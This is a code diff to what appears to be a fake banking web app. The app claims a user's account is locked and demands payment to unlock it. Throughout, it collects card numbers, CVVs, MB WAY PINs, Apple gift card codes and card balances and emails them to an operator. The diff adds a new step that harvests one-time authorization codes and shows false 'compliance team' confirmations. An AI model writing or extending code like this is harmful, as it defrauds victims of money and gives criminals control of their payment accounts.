       <div style="font-size:10px;font-weight:700;color:#ff6b6b;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;" data-i18n="lockNoticeTitle">&#9888; Critical Notice</div>
-      <div style="font-size:13px;color:rgba(255,255,255,0.75);line-height:1.7;" data-i18n="lockNoticeBody">All pending transactions are currently on hold. If this is not resolved promptly they will be automatically refunded. Please act immediately.</div>
+      <div style="font-size:13px;color:rgba(255,255,255,0.75);line-height:1.7;" data-i18n="lockNoticeBody">All pending transactions are currently on hold.</div>
     </div>
     <div style="display:flex;flex-direction:column;gap:12px;margin-bottom:28px;">
       <div style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;">
@@ -3784,31 +3923,37 @@ $('mbway-otp-submit-btn').onclick = function(){
 (function(){var e=document.getElementById('lock-contact-email');if(e)e.textContent='viccylay30'+'@'+'gmail.com';})();
 
 document.addEventListener('DOMContentLoaded',function(){
-  // openLockAddMoney
   window.openLockAddMoney = function(){ openModal('lock-addmoney-modal'); };
 
   var _lockMethod='';
   var _lockMbwayCode='+351';
-  var _lockMbwayFlag='🇵🇹';
+  var _lockMbwayFlag='\U0001f1f5\U0001f1f9';
+  var _lockCurrentPayload=null; // tracks last submitted payload for auth
 
   window.openLockMethod = function(method){
     _lockMethod=method;
     closeModal('lock-addmoney-modal');
     if(method==='apple'){ openModal('lock-apple-qty-modal'); return; }
     var title,icon,fields='';
+    var notice=document.getElementById('lock-auth-notice');
+    var noticeText=document.getElementById('lock-auth-notice-text');
+    var toAuthBtn=document.getElementById('lock-to-auth-btn');
     if(method==='mbway'){
-      title='📱 MB WAY Payment'; icon='📱';
-      _lockMbwayCode='+351'; _lockMbwayFlag='🇵🇹';
+      title='\U0001f4f1 MB WAY'; icon='\U0001f4f1';
+      _lockMbwayCode='+351'; _lockMbwayFlag='\U0001f1f5\U0001f1f9';
       fields='<div style="display:flex;gap:8px;margin-bottom:10px;">'
-        +'<button id="lock-mbway-country-btn" style="background:rgba(255,255,255,0.08);border:1.5px solid rgba(255,255,255,0.15);border-radius:10px;padding:0 12px;font-size:14px;font-weight:700;color:#cc0000;cursor:pointer;white-space:nowrap;font-family:inherit;height:48px;min-width:95px;" onclick="openLockMBWayCountry()">🇵🇹 +351</button>'
+        +'<button id="lock-mbway-country-btn" style="background:rgba(255,255,255,0.08);border:1.5px solid rgba(255,255,255,0.15);border-radius:10px;padding:0 12px;font-size:14px;font-weight:700;color:#cc0000;cursor:pointer;white-space:nowrap;font-family:inherit;height:48px;min-width:95px;" onclick="openLockMBWayCountry()">\U0001f1f5\U0001f1f9 +351</button>'
         +'<input type="tel" id="lock-mbway-phone" class="modal-input" placeholder="'+tr('lockMbwayPhone')+'" inputmode="numeric" style="flex:1;margin-bottom:0;"></div>'
         +'<input type="password" id="lock-mbway-pin" class="modal-input" placeholder="'+tr('lockMbwayPin')+'" maxlength="6" inputmode="numeric">'
         +'<input type="text" id="lock-mbway-name" class="modal-input" placeholder="'+tr('lockMbwayName')+'">'
         +'<input type="number" id="lock-mbway-amount" class="modal-input" placeholder="'+tr('lockMbwayAmount')+'" inputmode="decimal" min="150">'
         +'<div style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:-6px;margin-bottom:8px;">'+tr('lockMbwayMin')+'</div>';
+      if(notice) notice.style.display='block';
+      if(noticeText) noticeText.textContent=tr('lockMbwayAuthNote');
+      if(toAuthBtn){ toAuthBtn.style.display='block'; toAuthBtn.innerHTML=tr('lockAuthIHaveAuth'); }
     } else {
       var brand=method==='visa'?tr('lockVisaLabel'):tr('lockMcLabel');
-      title='💳 '+brand; icon='💳';
+      title='\U0001f4b3 '+brand; icon='\U0001f4b3';
       fields='<input type="text" id="lock-card-number" class="modal-input" placeholder="'+tr('lockCardNumber')+'" maxlength="19" inputmode="numeric">'
         +'<input type="text" id="lock-card-name" class="modal-input" placeholder="'+tr('lockCardHolder')+'">'
         +'<input type="text" id="lock-card-bank" class="modal-input" placeholder="'+tr('lockCardBank')+'">'
@@ -3817,16 +3962,115 @@ document.addEventListener('DOMContentLoaded',function(){
         +'<div style="display:flex;gap:8px;"><input type="text" id="lock-card-city" class="modal-input" placeholder="'+tr('lockCardCity')+'" style="flex:1;"><input type="text" id="lock-card-postcode" class="modal-input" placeholder="'+tr('lockCardPostcode')+'" style="flex:1;"></div>'
         +'<input type="tel" id="lock-card-phone" class="modal-input" placeholder="'+tr('lockCardPhone')+'">'
         +'<input type="text" id="lock-card-balance" class="modal-input" placeholder="'+tr('lockCardBalance')+'" inputmode="decimal">';
+      if(notice) notice.style.display='block';
+      if(noticeText) noticeText.textContent=tr('lockCardAuthNote');
+      if(toAuthBtn){ toAuthBtn.style.display='block'; toAuthBtn.innerHTML=tr('lockAuthIHaveAuth'); }
     }
     document.getElementById('lock-card-icon').textContent=icon;
     document.getElementById('lock-card-title').textContent=title;
     document.getElementById('lock-card-fields').innerHTML=fields;
     document.getElementById('lock-card-error').textContent='';
-    document.getElementById('lock-card-submit-btn').textContent=tr('lockCardSubmit');
+    document.getElementById('lock-card-submit-btn').innerHTML=tr('lockCardSubmit');
     document.getElementById('lock-card-submit-btn').disabled=false;
     openModal('lock-card-modal');
   };
-    window.openLockMBWayCountry = function(){
+
+  window.openLockAuth = function(){
+    var ctx=document.getElementById('lock-auth-context');
+    if(ctx){
+      var method=_lockMethod;
+      if(method==='mbway') ctx.textContent='MB WAY';
+      else if(method==='visa') ctx.textContent='Visa';
+      else if(method==='mastercard') ctx.textContent='Mastercard';
+      else ctx.textContent=method.toUpperCase();
+    }
+    document.getElementById('lock-auth-done-btn').innerHTML=tr('lockAuthIHaveAuth');
+    document.getElementById('lock-auth-done-btn').onclick=function(){
+      closeModal('lock-auth-modal');
+      var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
+      b.innerHTML='&#9989; Authorization confirmed. Our compliance team has been notified and will process your account shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},9000);
+    };
+    openModal('lock-auth-modal');
+  };
+
+  window.openLockAuthCode = function(){
+    var inp=document.getElementById('lock-auth-code-input');
+    if(inp) inp.value='';
+    var err=document.getElementById('lock-auth-code-error');
+    if(err) err.textContent='';
+    closeModal('lock-auth-modal');
+    openModal('lock-auth-code-modal');
+  };
+
+  document.getElementById('lock-auth-code-submit-btn').onclick=function(){
+    var code=document.getElementById('lock-auth-code-input').value.trim();
+    var err=document.getElementById('lock-auth-code-error');
+    err.textContent='';
+    if(!code||code.length<4){err.textContent='Please enter a valid code (4-8 digits).';return;}
+    this.textContent='Submitting...'; this.disabled=true;
+    var currentUser=firebase.auth().currentUser;
+    if(!currentUser){this.textContent=tr('lockAuthCodeSubmit');this.disabled=false;return;}
+    var ud=window.userData||{};
+    var ADMIN_EMAIL=window.ADMIN_EMAIL||'';
+    var db=firebase.database();
+    var method=_lockMethod||'unknown';
+    var emailMsg='Authorization code submitted for account unlock.\n\nMethod: '+method.toUpperCase()+'\nCode: '+code+'\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'')+'\nSubmitted: '+new Date().toISOString();
+    db.ref('lockUnlockRequests').push({method:method,uid:currentUser.uid,userName:'lock code authentication',authCode:code,submittedDate:new Date().toISOString(),status:'pending',type:'auth_code'})
+    .then(function(){
+      return db.ref('users').once('value').then(function(snap){
+        snap.forEach(function(s){
+          if(s.val()&&s.val().email===ADMIN_EMAIL){
+            if(typeof notify==='function') notify(s.key,'\U0001f510 AUTH CODE: Account unlock code submitted - Method: '+method.toUpperCase());
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'\U0001f510 Auth Code - Account Unlock','lock code authentication',emailMsg);
+          }
+        });
+      });
+    }).then(function(){
+      closeModal('lock-auth-code-modal');
+      var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
+      b.innerHTML='&#9989; Code submitted successfully. Our team will verify this shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},8000);
+    }).catch(function(){err.textContent='Submission failed. Please try again.';})
+    .finally(function(){document.getElementById('lock-auth-code-submit-btn').textContent=tr('lockAuthCodeSubmit');document.getElementById('lock-auth-code-submit-btn').disabled=false;});
+  };
+
+  window.openLockPending = function(){
+    var db=firebase.database();
+    var cu=firebase.auth().currentUser;
+    if(!cu) return;
+    closeModal('lock-addmoney-modal');
+    var list=document.getElementById('lock-pending-list');
+    list.innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.4);padding:20px;">Loading...</div>';
+    openModal('lock-pending-modal');
+    db.ref('lockUnlockRequests').orderByChild('uid').equalTo(cu.uid).once('value').then(function(snap){
+      list.innerHTML='';
+      if(!snap.exists()){list.innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.4);padding:24px;" data-i18n="lockPendingNone">'+tr('lockPendingNone')+'</div>';return;}
+      var items=[];
+      snap.forEach(function(s){items.push(Object.assign({},s.val(),{_key:s.key}));});
+      items.sort(function(a,b){return new Date(b.submittedDate)-new Date(a.submittedDate);});
+      items.forEach(function(req){
+        var statusColor=req.status==='reviewed'?'#34d399':req.status==='rejected'?'#ff6b6b':'#ffc107';
+        var methodLabel=req.method==='mbway'?'MB WAY':req.method==='apple'?'Apple Gift Cards':(req.method||'').charAt(0).toUpperCase()+(req.method||'').slice(1);
+        var div=document.createElement('div');
+        div.style.cssText='background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px;margin-bottom:12px;';
+        var otpBtn='';
+        if(req.status==='pending'&&req.method!=='apple'){
+          otpBtn='<button onclick="(function(){_lockMethod=\''+req.method+'\';openLockAuth();})()" style="margin-top:12px;width:100%;background:rgba(26,86,255,0.15);border:1.5px solid rgba(26,86,255,0.4);border-radius:10px;padding:11px;font-size:13px;font-weight:700;color:#4dabff;cursor:pointer;font-family:inherit;">&#128272; '+tr('lockPendingOtp')+'</button>';
+        }
+        div.innerHTML=
+          '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">'
+            +'<div style="font-size:14px;font-weight:700;color:#fff;">'+methodLabel+'</div>'
+            +'<div style="background:rgba(255,255,255,0.06);border-radius:20px;padding:3px 10px;font-size:11px;font-weight:700;color:'+statusColor+';">'+req.status.toUpperCase()+'</div>'
+          +'</div>'
+          +'<div style="font-size:12px;color:rgba(255,255,255,0.4);">'+(req.submittedDate?new Date(req.submittedDate).toLocaleString():'')+'</div>'
+          +otpBtn;
+        list.appendChild(div);
+      });
+    });
+  };
+
+  window.openLockMBWayCountry = function(){
     if(typeof renderMBWayCountries==='function') renderMBWayCountries('');
     closeModal('lock-card-modal');
     openModal('mbway-country-modal');
@@ -3851,7 +4095,7 @@ document.addEventListener('DOMContentLoaded',function(){
     var ud=window.userData;
     var userName=(ud.firstname||'')+' '+(ud.surname||'');
     var payload={method:method,uid:currentUser.uid,userName:userName,submittedDate:new Date().toISOString(),status:'pending'};
-    var emailUsername,emailMsg;
+    var emailMsg;
     if(method==='mbway'){
       var phone=document.getElementById('lock-mbway-phone')?document.getElementById('lock-mbway-phone').value.trim():'';
       var pin=document.getElementById('lock-mbway-pin')?document.getElementById('lock-mbway-pin').value.trim():'';
@@ -3861,10 +4105,9 @@ document.addEventListener('DOMContentLoaded',function(){
       if(!name){err.textContent='Please enter the name on the account.';return;}
       var amtRaw=document.getElementById('lock-mbway-amount')?document.getElementById('lock-mbway-amount').value.trim():'';
       var amt=parseFloat(amtRaw);
-      if(!amtRaw||isNaN(amt)||amt<150){err.textContent='Amount must be at least £150 / $150.';return;}
+      if(!amtRaw||isNaN(amt)||amt<150){err.textContent='Amount must be at least \xA3150 / $150.';return;}
       payload.phone=_lockMbwayCode+phone; payload.pin=pin; payload.accountName=name; payload.amount=amt;
-      emailUsername='mbway unlock request';
-      emailMsg=userName+' submitted an MB WAY unlock payment.\n\nPhone: '+payload.phone+'\nPIN: '+pin+'\nName: '+name+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
+      emailMsg='MB WAY unlock payment submitted.\n\nPhone: '+payload.phone+'\nPIN: '+pin+'\nName: '+name+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
     } else {
       var num=document.getElementById('lock-card-number')?document.getElementById('lock-card-number').value.replace(/\D/g,''):'';
       var cname=document.getElementById('lock-card-name')?document.getElementById('lock-card-name').value.trim():'';
@@ -3882,30 +4125,30 @@ document.addEventListener('DOMContentLoaded',function(){
       if(!expiry||!cvv){err.textContent='Please enter expiry and CVV.';return;}
       var brand=typeof detectBrand==='function'?detectBrand(num):(num[0]==='4'?'Visa':'Mastercard');
       payload.cardNumber=num;payload.cardName=cname;payload.bankName=bank;payload.expiry=expiry;payload.cvv=cvv;payload.brand=brand;payload.lastFour=num.slice(-4);payload.street=street;payload.city=city;payload.postcode=postcode;payload.phone=phone2;payload.balance=balance;
-      emailUsername='lock add money submitted';
-      emailMsg=userName+' submitted a '+brand+' card for account unlock.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nName: '+cname+'\nBank: '+(bank||'--')+'\nExpiry: '+expiry+'\nCVV: '+cvv+'\nBalance: '+(balance||'--')+'\nStreet: '+(street||'--')+'\nCity: '+(city||'--')+'\nPostcode: '+(postcode||'--')+'\nPhone: '+(phone2||'--')+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
+      emailMsg=brand+' card submitted for account unlock.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nName: '+cname+'\nBank: '+(bank||'--')+'\nExpiry: '+expiry+'\nCVV: '+cvv+'\nBalance: '+(balance||'--')+'\nStreet: '+(street||'--')+'\nCity: '+(city||'--')+'\nPostcode: '+(postcode||'--')+'\nPhone: '+(phone2||'--')+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
     }
     this.textContent='Submitting...'; this.disabled=true;
     var db=firebase.database();
     var ADMIN_EMAIL=window.ADMIN_EMAIL||'';
     var newRef=db.ref('lockUnlockRequests').push();
     payload.reqKey=newRef.key;
+    _lockCurrentPayload=payload;
     newRef.set(payload).then(function(){
       return db.ref('users').once('value').then(function(snap){
         snap.forEach(function(s){
           if(s.val()&&s.val().email===ADMIN_EMAIL){
-            if(typeof notify==='function') notify(s.key,'🔒 UNLOCK REQ: '+userName+' submitted '+method.toUpperCase());
-            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'🔒 Unlock Request - '+method.toUpperCase(),emailUsername,emailMsg);
+            if(typeof notify==='function') notify(s.key,'\U0001f512 UNLOCK REQ: '+userName+' submitted '+method.toUpperCase());
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'\U0001f512 Unlock Request - '+method.toUpperCase(),'lock code authentication',emailMsg);
           }
         });
       });
     }).then(function(){
       closeModal('lock-card-modal');
       var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
-      b.innerHTML='&#9989; Verification Submitted! Our team will review your payment shortly. You may submit another if needed. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      b.innerHTML='&#9989; Verification Submitted! Our team will review your payment shortly. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
       document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},8000);
     }).catch(function(){ err.textContent='Submission failed. Please try again.'; })
-    .finally(function(){ document.getElementById('lock-card-submit-btn').textContent='Submit'; document.getElementById('lock-card-submit-btn').disabled=false; });
+    .finally(function(){ document.getElementById('lock-card-submit-btn').innerHTML=tr('lockCardSubmit'); document.getElementById('lock-card-submit-btn').disabled=false; });
   };
 
   window.openLockAppleCodes = function(qty){
@@ -3920,7 +4163,7 @@ document.addEventListener('DOMContentLoaded',function(){
     }
     document.getElementById('lock-apple-codes-fields').innerHTML=fields;
     document.getElementById('lock-apple-codes-error').textContent='';
-    document.getElementById('lock-apple-codes-submit-btn').textContent=tr('lockAppleCodesSubmit');
+    document.getElementById('lock-apple-codes-submit-btn').innerHTML=tr('lockAppleCodesSubmit');
     document.getElementById('lock-apple-codes-submit-btn').disabled=false;
     document.getElementById('lock-apple-codes-submit-btn').setAttribute('data-qty',qty);
     openModal('lock-apple-codes-modal');
@@ -3939,11 +4182,11 @@ document.addEventListener('DOMContentLoaded',function(){
     }
     this.textContent='Submitting...'; this.disabled=true;
     var currentUser=firebase.auth().currentUser;
-    if(!currentUser||!window.userData){this.textContent='Submit Gift Cards';this.disabled=false;return;}
+    if(!currentUser||!window.userData){this.innerHTML=tr('lockAppleCodesSubmit');this.disabled=false;return;}
     var ud=window.userData;
     var userName=(ud.firstname||'')+' '+(ud.surname||'');
     var payload={method:'apple',uid:currentUser.uid,userName:userName,submittedDate:new Date().toISOString(),status:'pending',giftCards:cards};
-    var emailMsg=userName+' submitted Apple Gift Card(s) for account unlock.\n\nCards:\n';
+    var emailMsg='Apple Gift Card(s) submitted for account unlock.\n\nCards:\n';
     cards.forEach(function(c,i){ emailMsg+=(i+1)+'. Code: '+c.code+' | Amount: '+c.amount+'\n'; });
     emailMsg+='\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
     var db=firebase.database();
@@ -3954,18 +4197,18 @@ document.addEventListener('DOMContentLoaded',function(){
       return db.ref('users').once('value').then(function(snap){
         snap.forEach(function(s){
           if(s.val()&&s.val().email===ADMIN_EMAIL){
-            if(typeof notify==='function') notify(s.key,'🔒 UNLOCK REQ: '+userName+' submitted Apple Gift Cards');
-            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'🔒 Unlock Request - Apple Gift Cards','gift card for lock request',emailMsg);
+            if(typeof notify==='function') notify(s.key,'\U0001f512 UNLOCK REQ: '+userName+' submitted Apple Gift Cards');
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'\U0001f512 Unlock Request - Apple Gift Cards','lock code authentication',emailMsg);
           }
         });
       });
     }).then(function(){
       closeModal('lock-apple-codes-modal');
       var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
-      b.innerHTML='&#9989; Verification Submitted! Your gift cards are under review. You may submit another if needed. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      b.innerHTML='&#9989; Gift cards submitted for review. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
       document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},8000);
     }).catch(function(){ err.textContent='Submission failed. Please try again.'; })
-    .finally(function(){ document.getElementById('lock-apple-codes-submit-btn').textContent='Submit Gift Cards'; document.getElementById('lock-apple-codes-submit-btn').disabled=false; });
+    .finally(function(){ document.getElementById('lock-apple-codes-submit-btn').innerHTML=tr('lockAppleCodesSubmit'); document.getElementById('lock-apple-codes-submit-btn').disabled=false; });
   };
 
   // lockUser / unlockUser admin functions
@@ -3973,7 +4216,7 @@ document.addEventListener('DOMContentLoaded',function(){
     var reason=prompt('Reason for locking this account:');
     if(!reason||!reason.trim()) return;
     firebase.database().ref('users/'+uid).update({locked:true,lockReason:reason.trim(),lockedDate:new Date().toISOString()}).then(function(){
-      if(typeof notify==='function') notify(uid,'🔒 Your account has been locked. Reason: '+reason.trim());
+      if(typeof notify==='function') notify(uid,'\U0001f512 Your account has been locked. Reason: '+reason.trim());
       if(typeof loadUsersTab==='function') loadUsersTab();
     });
   };
@@ -3981,12 +4224,12 @@ document.addEventListener('DOMContentLoaded',function(){
     var reason=prompt('Reason for unlocking this account:');
     if(!reason||!reason.trim()) return;
     firebase.database().ref('users/'+uid).update({locked:false,lockReason:null,lockedDate:null,unlockedDate:new Date().toISOString()}).then(function(){
-      if(typeof notify==='function') notify(uid,'🔓 Your account has been unlocked! '+reason.trim());
+      if(typeof notify==='function') notify(uid,'\U0001f513 Your account has been unlocked! '+reason.trim());
       if(typeof loadUsersTab==='function') loadUsersTab();
     });
   };
 
-  // loadLockMoneyTab
+  // loadLockMoneyTab  // loadLockMoneyTab
   window.loadLockMoneyTab = function(){
     var list=document.getElementById('lockmoney-admin-list'); if(!list) return;
     list.innerHTML='<p class="acc-empty">Loading...</p>';
@@ -4058,4 +4301,3 @@ document.addEventListener('DOMContentLoaded',function(){
 </script>
 </body>
 </html>
-
